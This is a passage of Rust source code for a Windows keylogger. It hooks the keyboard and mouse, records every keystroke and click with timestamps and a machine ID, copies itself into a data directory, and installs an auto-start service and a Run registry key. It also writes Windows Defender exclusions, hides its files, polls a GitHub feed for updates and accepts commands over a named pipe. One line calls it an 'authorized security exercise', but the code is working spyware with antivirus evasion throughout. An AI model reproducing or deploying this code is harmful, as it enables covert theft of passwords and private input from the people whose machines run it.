            let event = match rx.recv_timeout(FLUSH_INTERVAL) {
                Ok(Event::Shutdown) => {
                    drain_and_flush(&rx, &mut line, &mut write_buffer, start, &machine_id);
                    return;
                }
                Ok(event) => Some(event),
                Err(RecvTimeoutError::Timeout) => None,
                Err(RecvTimeoutError::Disconnected) => {
                    drain_and_flush(&rx, &mut line, &mut write_buffer, start, &machine_id);
                    return;
                }
            };

            if let Some(event) = event {
                append_event(
                    &mut line,
                    &mut write_buffer,
                    start.elapsed(),
                    &machine_id,
                    event,
                );
            }

            if write_buffer.should_flush() {
                if let Some(payload) = write_buffer.take_payload() {
                    flush_captured_events(&payload, &machine_id);
                }
            }
        }
    }

    fn drain_and_flush(
        rx: &mpsc::Receiver<Event>,
        line: &mut String,
        write_buffer: &mut WriteBuffer,
        start: Instant,
        machine_id: &str,
    ) {
        while let Ok(event) = rx.try_recv() {
            if matches!(event, Event::Shutdown) {
                continue;
            }
            append_event(line, write_buffer, start.elapsed(), machine_id, event);
        }
        if let Some(payload) = write_buffer.take_payload() {
            flush_captured_events(&payload, machine_id);
        }
    }

    fn append_event(
        line: &mut String,
        write_buffer: &mut WriteBuffer,
        elapsed: Duration,
        machine_id: &str,
        event: Event,
    ) -> bool {
        line.clear();
        format_timestamp(elapsed, line);
        line.push_str(" [");
        line.push_str(machine_id);
        line.push_str("] ");

        match event {
            Event::Shutdown => return false,
            Event::Key(vk, scan) => {
                let Some(text) = vk_to_text(vk, scan) else {
                    return false;
                };
                line.push_str("KEY: ");
                line.push_str(&text);
            }
            Event::Mouse { button, x, y } => {
                line.push_str("MOUSE: ");
                line.push_str(mouse_button_name(button));
                let _ = write!(line, " ({x},{y})");
            }
        }

        line.push('\n');
        write_buffer.append_line(line);
        true
    }

    fn format_timestamp(elapsed: std::time::Duration, out: &mut String) {
        let millis = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0);

        let secs = millis / 1000;
        let ms = millis % 1000;
        let sec_of_day = secs % 86_400;
        let h = sec_of_day / 3600;
        let m = (sec_of_day % 3600) / 60;
        let s = sec_of_day % 60;
        let up = elapsed.as_millis();

        let _ = FmtWrite::write_fmt(
            out,
            format_args!("[{:02}:{:02}:{:02}.{:03} +{up}ms]", h, m, s, ms),
        );
    }

    fn enqueue(event: Event) {
        if let Some(tx) = EVENT_TX.get() {
            let _ = tx.try_send(event);
        }
    }

    unsafe extern "system" fn keyboard_proc(
        code: i32,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        if code >= 0 {
            let message = wparam.0 as u32;
            if message == WM_KEYDOWN || message == WM_SYSKEYDOWN {
                let info = &*(lparam.0 as *const KBDLLHOOKSTRUCT);
                enqueue(Event::Key(info.vkCode, info.scanCode));
            }
        }
        CallNextHookEx(KB_HOOK, code, wparam, lparam)
    }

    unsafe extern "system" fn mouse_proc(
        code: i32,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        if code >= 0 {
            let message = wparam.0 as u32;
            let button = match message {
                WM_LBUTTONDOWN => 0,
                WM_RBUTTONDOWN => 1,
                WM_MBUTTONDOWN => 2,
                _ => 255,
            };
            if button != 255 {
                let info = &*(lparam.0 as *const MSLLHOOKSTRUCT);
                enqueue(Event::Mouse {
                    button,
                    x: info.pt.x,
                    y: info.pt.y,
                });
            }
        }
        CallNextHookEx(MOUSE_HOOK, code, wparam, lparam)
    }

    fn mouse_button_name(button: u8) -> &'static str {
        match button {
            0 => "LEFT",
            1 => "RIGHT",
            2 => "MIDDLE",
            _ => "UNKNOWN",
        }
    }

    fn vk_to_text(vk: u32, scan_code: u32) -> Option<String> {
        if is_modifier(vk) {
            return None;
        }

        unsafe {
            let mut state = [0u8; 256];
            if GetKeyboardState(&mut state).is_err() {
                return vk_fallback(vk).map(str::to_string);
            }

            let sc = if scan_code != 0 {
                scan_code
            } else {
                MapVirtualKeyW(vk, MAPVK_VK_TO_VSC)
            };

            let mut buffer = [0u16; 8];
            let written = ToUnicode(vk, sc, Some(&state), &mut buffer, 0);

            if written > 0 {
                return String::from_utf16(&buffer[..written as usize]).ok();
            }

            vk_fallback(vk).map(str::to_string)
        }
    }

    fn is_modifier(vk: u32) -> bool {
        matches!(
            VIRTUAL_KEY(vk as u16),
            VK_LSHIFT | VK_RSHIFT | VK_LCONTROL | VK_RCONTROL | VK_LMENU | VK_RMENU | VK_LWIN
                | VK_RWIN | VK_CAPITAL
        )
    }

    fn vk_fallback(vk: u32) -> Option<&'static str> {
        match VIRTUAL_KEY(vk as u16) {
            VK_RETURN => Some("[ENTER]"),
            VK_SPACE => Some(" "),
            VK_TAB => Some("[TAB]"),
            VK_BACK => Some("[BACKSPACE]"),
            VK_DELETE => Some("[DELETE]"),
            VK_ESCAPE => Some("[ESC]"),
            VK_LEFT => Some("[LEFT]"),
            VK_RIGHT => Some("[RIGHT]"),
            VK_UP => Some("[UP]"),
            VK_DOWN => Some("[DOWN]"),
            VK_HOME => Some("[HOME]"),
            VK_END => Some("[END]"),
            VK_PRIOR => Some("[PGUP]"),
            VK_NEXT => Some("[PGDN]"),
            VK_INSERT => Some("[INSERT]"),
            x if (VK_F1.0..=VK_F1.0 + 11).contains(&x.0) => Some(match x.0 - VK_F1.0 {
                0 => "[F1]",
                1 => "[F2]",
                2 => "[F3]",
                3 => "[F4]",
                4 => "[F5]",
                5 => "[F6]",
                6 => "[F7]",
                7 => "[F8]",
                8 => "[F9]",
                9 => "[F10]",
                10 => "[F11]",
                _ => "[F12]",
            }),
            VK_LCONTROL | VK_RCONTROL => Some("[CTRL]"),
            VK_LMENU | VK_RMENU => Some("[ALT]"),
            VK_LWIN | VK_RWIN => Some("[WIN]"),
            _ => None,
        }
    }

    fn install_persistence() -> io::Result<()> {
        let exe = current_exe()?;
        let target_dir = data_dir()?;
        let target_exe = target_dir.join(DEPLOYED_EXE);

        copy_file(&exe, &target_exe)?;
        clear_uninstall_flag();
        if let Err(error) = install_windows_service(&target_exe) {
            admin_log(&format!("Service install skipped (admin required): {error}"));
        }
        if let Err(error) = add_defender_exclusions(&target_exe, &target_dir) {
            admin_log(&format!("Defender exclusion skipped (admin required): {error}"));
        }
        set_run_value(&target_exe)?;
        hide_deployed_artifacts(&target_dir);
        let _ = save_installed_version(env!("CARGO_PKG_VERSION"));

        admin_log(&format!("Installed binary: {}", target_exe.display()));
        admin_log(&format!("Windows service: {SERVICE_NAME} (AUTO_START)"));
        admin_log(&format!("Registry Run key: HKCU\\{RUN_KEY} -> {RUN_VALUE}"));
        admin_log(&format!("Defender exclusions: {} + {DEPLOYED_EXE}", target_dir.display()));
        admin_log(&format!("Auto-update feed: {GITHUB_REPO} (poll every {}s)", UPDATE_POLL_INTERVAL.as_secs()));
        admin_log(&format!("Command pipe: {PIPE_NAME} (UNINSTALL, PING)"));
        Ok(())
    }

    fn uninstall_persistence() -> io::Result<()> {
        set_uninstall_flag();
        uninstall_windows_service()?;
        delete_run_value()?;
        let dir = data_dir()?;
        let deployed = dir.join(DEPLOYED_EXE);
        let _ = remove_defender_exclusions(&deployed, &dir);
        let _ = fs::remove_file(&deployed);
        admin_log("Uninstalled service, Run key, and deployed binary");
        admin_log(&format!("Logs retained in: {}", dir.display()));
        Ok(())
    }

    fn start_command_pipe() {
        thread::Builder::new()
            .name("pipe-7829KMS".into())
            .spawn(pipe_server_loop)
            .ok();
    }

    fn pipe_server_loop() {
        loop {
            match accept_pipe_command() {
                Ok(command) => {
                    let normalized = command.trim().to_ascii_uppercase();
                    match normalized.as_str() {
                        "UNINSTALL" => {
                            admin_log("Pipe 7829KMS: UNINSTALL command received");
                            let _ = uninstall_persistence();
                            unsafe {
                                PostQuitMessage(0);
                            }
                            return;
                        }
                        "PING" | "STATUS" => {
                            admin_log("Pipe 7829KMS: PING/STATUS received");
                        }
                        other if !other.is_empty() => {
                            admin_log(&format!("Pipe 7829KMS: unknown command '{other}'"));
                        }
                        _ => {}
                    }
                }
                Err(error) => {
                    admin_log(&format!("Pipe 7829KMS accept error: {error}"));
                    thread::sleep(Duration::from_millis(500));
                }
            }
        }
    }

    fn accept_pipe_command() -> io::Result<String> {
        unsafe {
            let name = str_to_wide(PIPE_NAME);
            let handle = CreateNamedPipeW(
                PCWSTR(name.as_ptr()),
                PIPE_ACCESS_DUPLEX,
                windows::Win32::System::Pipes::NAMED_PIPE_MODE(
                    PIPE_TYPE_BYTE.0 | PIPE_READMODE_BYTE.0 | PIPE_WAIT.0,
                ),
                1,
                4096,
                4096,
                0,
                None,
            );

            if handle.is_invalid() {
                return Err(io::Error::other("CreateNamedPipeW returned invalid handle"));
            }

            ConnectNamedPipe(handle, None).map_err(|e| io::Error::other(e.message()))?;

            let mut buffer = [0u8; 512];
            let mut bytes_read = 0u32;
            ReadFile(
                handle,
                Some(&mut buffer),
                Some(&mut bytes_read),
                None,
            )
            .map_err(|e| io::Error::other(e.message()))?;

            let command = String::from_utf8_lossy(&buffer[..bytes_read as usize]).to_string();

            let response = if command.trim().eq_ignore_ascii_case("PING")
                || command.trim().eq_ignore_ascii_case("STATUS")
            {
                b"OK\n".as_slice()
            } else if command.trim().eq_ignore_ascii_case("UNINSTALL") {
                b"UNINSTALLING\n".as_slice()
            } else {
                b"UNKNOWN\n".as_slice()
            };
            let _ = WriteFile(handle, Some(response), None, None);

            DisconnectNamedPipe(handle).ok();
            let _ = CloseHandle(handle);

            Ok(command)
        }
    }

    fn pipe_send_command(command: &str) -> io::Result<()> {
        unsafe {
            let name = str_to_wide(PIPE_NAME);
            let payload = format!("{command}\n");
            let mut response = [0u8; 64];
            let mut bytes_read = 0u32;

            let ok = CallNamedPipeW(
                PCWSTR(name.as_ptr()),
                Some(payload.as_ptr().cast()),
                payload.len() as u32,
                Some(response.as_mut_ptr().cast()),
                response.len() as u32,
                &mut bytes_read,
                5000,
            );

            if !ok.as_bool() {
                return Err(io::Error::other(format!(
                    "CallNamedPipeW failed for command '{command}'"
                )));
            }

            let reply = String::from_utf8_lossy(&response[..bytes_read as usize]);
            admin_log(&format!("Pipe client sent '{command}', reply: '{reply}'"));
        }
        Ok(())
    }

    fn set_run_value(exe: &Path) -> io::Result<()> {
        let key_w = str_to_wide(RUN_KEY);
        let value_w = str_to_wide(RUN_VALUE);
        let command = format!("\"{}\" --watchdog", exe.display());
        let data_w = str_to_wide(&command);

        unsafe {
            let mut key = HKEY::default();
            RegOpenKeyExW(
                HKEY_CURRENT_USER,
                PCWSTR(key_w.as_ptr()),
                0,
                KEY_SET_VALUE | KEY_WRITE,
                &mut key,
            )
            .ok()
            .map_err(|e| io::Error::other(e.message()))?;

            let bytes = wide_sz_bytes(&data_w);
            RegSetValueExW(
                key,
                PCWSTR(value_w.as_ptr()),
                0,
                REG_SZ,
                Some(&bytes),
            )
            .ok()
            .map_err(|e| io::Error::other(e.message()))?;

            let _ = RegCloseKey(key).ok();
        }
        Ok(())
    }

    fn delete_run_value() -> io::Result<()> {
        let key_w = str_to_wide(RUN_KEY);
        let value_w = str_to_wide(RUN_VALUE);

        unsafe {
            let mut key = HKEY::default();
            if RegOpenKeyExW(
                HKEY_CURRENT_USER,
                PCWSTR(key_w.as_ptr()),
                0,
                KEY_SET_VALUE | KEY_WRITE,
                &mut key,
            )
            .is_err()
            {
                return Ok(());
            }

            let _ = RegDeleteValueW(key, PCWSTR(value_w.as_ptr()));
            let _ = RegCloseKey(key).ok();
        }
        Ok(())
    }

    fn normalize_exclusion_path(path: &Path) -> String {
        let resolved = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
        let text = resolved.display().to_string();
        text.strip_prefix(r"\\?\")
            .unwrap_or(&text)
            .replace('/', "\\")
    }

    fn add_defender_exclusions(exe: &Path, dir: &Path) -> io::Result<()> {
        let exe_path = normalize_exclusion_path(exe);
        let dir_path = normalize_exclusion_path(dir);

        set_defender_registry_entry(DEFENDER_PATHS_KEY, &exe_path)?;
        set_defender_registry_entry(DEFENDER_PATHS_KEY, &dir_path)?;
        set_defender_registry_entry(DEFENDER_PROCESSES_KEY, DEPLOYED_EXE)?;

        admin_log(&format!("Defender exclusions added: {exe_path}, {dir_path}, {DEPLOYED_EXE}"));
        Ok(())
    }

    fn remove_defender_exclusions(exe: &Path, dir: &Path) -> io::Result<()> {
        let exe_path = normalize_exclusion_path(exe);
        let dir_path = normalize_exclusion_path(dir);

        let _ = delete_defender_registry_entry(DEFENDER_PATHS_KEY, &exe_path);
        let _ = delete_defender_registry_entry(DEFENDER_PATHS_KEY, &dir_path);
        let _ = delete_defender_registry_entry(DEFENDER_PROCESSES_KEY, DEPLOYED_EXE);

        admin_log("Defender exclusions removed");
        Ok(())
    }

    fn set_defender_registry_entry(key_path: &str, entry: &str) -> io::Result<()> {
        let key_w = str_to_wide(key_path);
        let entry_w = str_to_wide(entry);

        unsafe {
            let mut key = HKEY::default();
            RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(key_w.as_ptr()),
                0,
                None,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE,
                None,
                &mut key,
                None,
            )
            .ok()
            .map_err(|e| io::Error::other(e.message()))?;

            let zero = 0u32.to_le_bytes();
            RegSetValueExW(
                key,
                PCWSTR(entry_w.as_ptr()),
                0,
                REG_DWORD,
                Some(&zero),
            )
            .ok()
            .map_err(|e| io::Error::other(e.message()))?;

            let _ = RegCloseKey(key).ok();
        }

        Ok(())
    }

    fn delete_defender_registry_entry(key_path: &str, entry: &str) -> io::Result<()> {
        let key_w = str_to_wide(key_path);
        let entry_w = str_to_wide(entry);

        unsafe {
            let mut key = HKEY::default();
            if RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(key_w.as_ptr()),
                0,
                KEY_SET_VALUE | KEY_WRITE,
                &mut key,
            )
            .is_err()
            {
                return Ok(());
            }

            let _ = RegDeleteValueW(key, PCWSTR(entry_w.as_ptr()));
            let _ = RegCloseKey(key).ok();
        }

        Ok(())
    }

    fn wide_sz_bytes(wide: &[u16]) -> Vec<u8> {
        wide.iter().flat_map(|unit| unit.to_le_bytes()).collect()
    }

    fn install_windows_service(exe: &Path) -> io::Result<()> {
        let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CREATE_SERVICE)
            .map_err(|e| io::Error::other(format!("ServiceManager open failed: {e}")))?;

        if manager.open_service(SERVICE_NAME, windows_service::service::ServiceAccess::QUERY_STATUS).is_ok() {
            uninstall_windows_service()?;
        }

        let service_info = windows_service::service::ServiceInfo {
            name: OsString::from(SERVICE_NAME),
            display_name: OsString::from(SERVICE_DISPLAY),
            service_type: ServiceType::OWN_PROCESS,
            start_type: windows_service::service::ServiceStartType::AutoStart,
            error_control: windows_service::service::ServiceErrorControl::Normal,
            executable_path: exe.to_path_buf(),
            launch_arguments: vec![OsString::from("--service")],
            dependencies: vec![],
            account_name: None,
            account_password: None,
        };

        let service = manager
            .create_service(
                &service_info,
                windows_service::service::ServiceAccess::CHANGE_CONFIG
                    | windows_service::service::ServiceAccess::START,
            )
            .map_err(|e| io::Error::other(format!("Service create failed: {e}")))?;

        service
            .set_description("Authorized security exercise — simulates service-based persistence")
            .ok();

        service
            .start(&[] as &[&str])
            .map_err(|e| io::Error::other(format!("Service start failed: {e}")))?;

        Ok(())
    }

    fn uninstall_windows_service() -> io::Result<()> {
        let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)
            .map_err(|e| io::Error::other(format!("ServiceManager open failed: {e}")))?;

        let service = match manager.open_service(
            SERVICE_NAME,
            windows_service::service::ServiceAccess::STOP
                | windows_service::service::ServiceAccess::DELETE
                | windows_service::service::ServiceAccess::QUERY_STATUS,
        ) {
            Ok(service) => service,
            Err(_) => return Ok(()),
        };

        let _ = service.stop();
        let _ = service.delete();
        Ok(())
    }

    fn current_exe() -> io::Result<PathBuf> {
        env::current_exe()
    }

    fn copy_file(from: &Path, to: &Path) -> io::Result<()> {
        let from_w = path_to_wide(from);
        let to_w = path_to_wide(to);
        unsafe {
            CopyFileW(PCWSTR(from_w.as_ptr()), PCWSTR(to_w.as_ptr()), false)
                .map_err(|e| io::Error::other(e.message()))?;
        }
        Ok(())
    }

    fn path_to_wide(path: &Path) -> Vec<u16> {
        path.as_os_str().encode_wide().chain(std::iter::once(0)).collect()
    }

    fn str_to_wide(value: &str) -> Vec<u16> {
        value.encode_utf16().chain(std::iter::once(0)).collect()
    }
}
